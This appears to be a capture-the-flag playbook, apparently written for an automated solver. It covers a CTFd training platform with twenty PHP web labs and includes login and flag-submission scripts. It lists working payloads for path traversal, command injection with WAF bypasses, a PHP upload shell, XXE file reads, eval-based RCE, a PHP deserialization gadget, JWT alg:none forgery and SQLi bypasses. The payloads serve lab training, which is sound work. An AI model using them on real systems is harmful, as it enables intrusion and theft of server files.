# CTFd + Per-Lab Web Challenge Platform — Reference Patterns

Captured from a 20/20 sweep on **115 年度教育體系資安技術檢測研討課程** (CTFd @ `172.16.253.101:8000`, training platform, 2026-06-21).

Use this when the target is a CTFd training deployment with one independent webapp per challenge under a common path prefix (e.g. `/labs/<slug>/`). The patterns below are version-agnostic; only the lab slugs and exact hints are platform-specific.

## Platform architecture

- **CTFd shell** at the public URL (port 8000 here) — login, scoreboard, `/challenges`, `/api/v1/challenges`.
- **Per-challenge lab** on the same host, port 80, under `/labs/<slug>/`. Apache vhost, ServerName like `pp-lab-<slug>`. Independent PHP/Apache/SQLite webapp per challenge.
- **Flag storage**: `/run/flags/<slug>.txt` — directly readable from a successful exploit; never readable from the CTFd nginx (404 by design).
- **Submit flow**: CTFd `/api/v1/challenges/attempt` POST with `{"challenge_id": N, "submission": "flag{...}"}`. Requires logged-in session cookie.

## Login quirks to know up-front

- Submit button is `<input type="submit" id="_submit">`, **not** `<button type="submit">`. Playwright `button[type="submit"]` selector will time out. Use `page.click('#_submit')`.
- Form fields: `<input name="name">` (username), `<input name="password">`, hidden `<input name="nonce">`.
- After login, redirect lands on `/challenges`. Watch for that URL change instead of `networkidle` — CTFd keeps WS/HLS keepalive that prevents `networkidle` from ever firing. Use:
  ```python
  page.click('#_submit')
  page.wait_for_url(lambda u: "/login" not in u, timeout=15000)
  page.wait_for_load_state("domcontentloaded", timeout=10000)
  ```
- **Reuse cookies from Playwright state.json with `requests`** (no need to keep the browser open for API work):
  ```python
  import json, http.cookiejar, requests
  from http.cookiejar import Cookie
  state = json.load(open("/tmp/ctf_session/state.json"))
  jar = http.cookiejar.CookieJar()
  for c in state["cookies"]:
      jar.set_cookie(Cookie(version=0, name=c["name"], value=c["value"],
                             port=None, port_specified=False,
                             domain=c["domain"], domain_specified=True,
                             domain_initial_dot=False,
                             path=c["path"], path_specified=True,
                             secure=c.get("secure", False),
                             expires=c.get("expires"), discard=False,
                             comment=None, comment_url=None, rest={}, rfc2109=False))
  sess = requests.Session(); sess.cookies = jar
  ```

## Per-lab probe sequence (always do this first)

1. `curl -sS -o /tmp/lab.html http://HOST/labs/<slug>/` then strip CSS/JS and read the prose. The page almost always reveals:
   - The sensitive file path (e.g. `/run/flags/<slug>.txt`)
   - The technique hint (e.g. "Try: `admin'/**/OR/**/1=1#`")
   - The exact parameter name — **don't assume `?id=`**, common alternates are `?q=`, `?username=`, `?ip=`, `?host=`, `?page=`, `?url=`, `?file=`, `?tpl=`, `?token=`, `?cmd=`
2. `grep -oE '<form[^>]*>|<input[^>]*>|<a[^>]*>'` to enumerate fields and **form action**. CSRF challenges may POST to `/change.php` while the visible form posts back to the same page.
3. First probe with the exact hint payload from the page — these platforms usually gate the flag behind the technique they hint at.

## Exploitation recipes (the 20-category catalog)

| Category | Parameter / Endpoint | Working payload |
|---|---|---|
| Path Traversal | `?file=` | `../../../../run/flags/<slug>.txt` |
| Reflected XSS | `?q=` | `<img src=x onerror=alert(1)>` — flag is in response once payload is rendered |
| Weak Password | POST `username`/`password` | `admin` / `password123` (most common pair on training platforms) |
| SVN Leak | `/.svn/entries` | Direct GET; SQLite wc.db also leaks if exposed |
| SQL Injection | `?username=` | `admin' OR '1'='1` (often `admin` alone returns the row) |
| SQLMap-style SQLi | `?id=` | Try `?id=3`, `?id=4`, etc. — admin note is often row 3 |
| Command Injection | `?host=` | `127.0.0.1;cat /run/flags/<slug>.txt` |
| File Upload | POST `file` | `<?php echo file_get_contents('/run/flags/<slug>.txt'); ?>` then GET `/labs/<slug>/uploads/shell.php` |
| LFI | `?page=` | `../../../../run/flags/<slug>.txt` |
| Stored XSS | POST `comment` | Same XSS payload — flag appears in the rendered comments list |
| SSRF | `?url=` | `http://ssrf-internal/` (vhost name hint) |
| IDOR | `?id=` | Loop `?id=1..30`; admin row usually within first 10 |
| CSRF | POST `/change.php` | `action=update_email&email=attacker@evil.test` — no CSRF token check |
| SQLi WAF | `?q=` | `'/**/OR/**/'1'='1` (comment-split bypass) |
| CMDi WAF | `?ip=` | `127.0.0.1 $(cat /run/flags/<slug>.txt)` (subshell bypass, NOT blocked by WAF targeting `;`/`&&`/`\|`) |
| JWT Attack | `?token=` | `alg:none` + payload `{"user":"admin","role":"admin"}` — server doesn't verify signature |
| XML Injection (XXE) | POST `xml` | `<!ENTITY xxe SYSTEM "file:///run/flags/<slug>.txt">` |
| SSTI (PHP eval) | `?tpl=` | `system('cat /run/flags/<slug>.txt');` — **NOT Jinja2 syntax** |
| Deserialization (PHP) | `?data=` | `O:7:"Exploit":1:{s:3:"cmd";s:34:"cat /run/flags/<slug>.txt";}` |
| Weak Password Bruteforce | POST | Same as Weak Password: `admin` / `password123` |

## Critical pitfalls

- **PHP serialization byte length trap**: `s:N:"string"` — `N` is exact byte count, not character count. Off-by-one makes the property get truncated and `system()` receives empty string. Always compute `len("cat /run/flags/deserialization.txt") == 34`, never copy from a similar-looking payload.
- **SSTI backend identification**: 90% of these challenges are **PHP `eval()`** because the host runs Apache + PHP. `{{7*7}}` will fail with "syntax error, unexpected token '{'". Start with `1+1` (returns `2`); if it works, the language is PHP. Then try `system('id');` to confirm RCE.
- **SQLi on SQLite**: `LOAD_FILE()` is MySQL-only. Don't bother with it; use UNION/ORDER BY probing or just enumerate IDs.
- **CSRF hidden endpoint**: when the visible `<form action="/">` posts back to the page, check the rendered page source — the actual vulnerable endpoint is often a sibling `.php` like `/change.php`, `/update.php`. Don't tunnel through the visible form.
- **CTFd "submitted successfully" 200 OK vs flag hidden in cookie / localStorage**: CTFd itself only stores flags; the lab page is where the flag string lives. If you see `Login success` or `200 OK` plus `flag{`, that's your flag — don't go looking in CTFd's submission UI.
- **No `flag{}` template enforced**: this platform uses `flag{16-char-hex}` shape consistently. `grep -oE 'flag\{[^}]+\}'` is reliable; also try `FLAG{...}`, `ctf{...}`.
- **networkidle never fires** in CTFd shell pages — always use `domcontentloaded` + URL polling.

## Quick command to dump all 20 hints

```bash
for slug in path-traversal reflected-xss weak-password weak-password-bruteforce \
            svn-leak sql-injection sqlmap-sqli command-injection file-upload \
            lfi stored-xss ssrf idor csrf sqli-waf cmdi-waf jwt-attack \
            xml-injection ssti deserialization; do
  echo "==== $slug ===="
  curl -sS "http://HOST/labs/$slug/" | sed -E 's/<style[^>]*>.*<\/style>//g; s/<script[^>]*>.*<\/script>//g; s/<[^>]+>/ /g' | tr -s ' \n' ' ' | head -c 400
  echo
done
```

## Flag-submission pattern

```python
sess.post(f"{BASE}/api/v1/challenges/attempt",
          json={"challenge_id": cid, "submission": flag},
          headers={"Content-Type": "application/json"})
# Response: {"success": true, "data": {"status": "correct"}}
```

The submission endpoint requires the CTFd session cookie, **not** a separate API token. Login once via Playwright, then drive everything else via `requests.Session` with reused cookies.
